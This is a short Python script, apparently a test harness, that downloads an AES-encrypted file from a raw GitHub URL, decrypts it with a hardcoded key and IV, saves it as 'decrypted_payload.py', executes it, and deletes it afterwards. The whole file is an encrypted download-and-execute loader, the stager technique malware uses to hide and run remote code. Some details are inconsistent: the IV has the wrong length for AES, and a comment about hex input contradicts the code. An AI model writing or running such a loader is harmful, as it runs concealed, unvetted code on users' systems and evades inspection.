import requests
import subprocess
import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# --- DATA FROM YOUR IMAGE ---
# Note: Ensure these match the FULL strings from your CyberChef 'Key' and 'IV' fields.
RAW_KEY = "quhwc723c3rr3rd3" # Replace with your full Key string
RAW_IV  = "123222332n239fb32f3" # Replace with your full IV string

# Convert UTF8 strings to bytes
AES_KEY = RAW_KEY.encode('utf-8')
AES_IV  = RAW_IV.encode('utf-8')

def download_decrypt_run(url, decrypted_file):
    try:
        # 1. Download the raw encrypted bytes
        print(f"Downloading binary data from {url}...")
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        # We take the content as raw bytes directly
        encrypted_data = response.content

        # 2. Decrypt using CBC mode
        print("Initializing Decryption...")
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        
        # Decrypt and remove PKCS7 padding
        decrypted_code = unpad(cipher.decrypt(encrypted_data), AES.block_size)

        # 3. Save to a temporary Python file
        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_code)
        
        # 4. Execute the script
        print(f"Executing decrypted script...\n" + "="*30)
        
        # We use sys.executable to maintain the current environment
        result = subprocess.run(
            [sys.executable, decrypted_file], 
            capture_output=True, 
            text=True
        )
        
        # Display the result of the executed script
        print("OUTPUT:\n", result.stdout)
        if result.stderr:
            print("ERRORS:\n", result.stderr)

    except ValueError as ve:
        print(f"Decryption Error: {ve}")
        print("Tip: Check if your Key/IV are the correct length or if the file is truly raw bytes.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        # 5. Security Cleanup
        if os.path.exists(decrypted_file):
            os.remove(decrypted_file)
            print(f"\n[!] Cleanup: {decrypted_file} has been deleted.")

if __name__ == "__main__":
    # The URL should point to a text file containing the Hex string
    ENCRYPTED_URL = "https://raw.githubusercontent.com/AmitActiveFence/act_tests/refs/heads/main/enc.py"
    TEMP_SCRIPT = "decrypted_payload.py"
    
    download_decrypt_run(ENCRYPTED_URL, TEMP_SCRIPT)
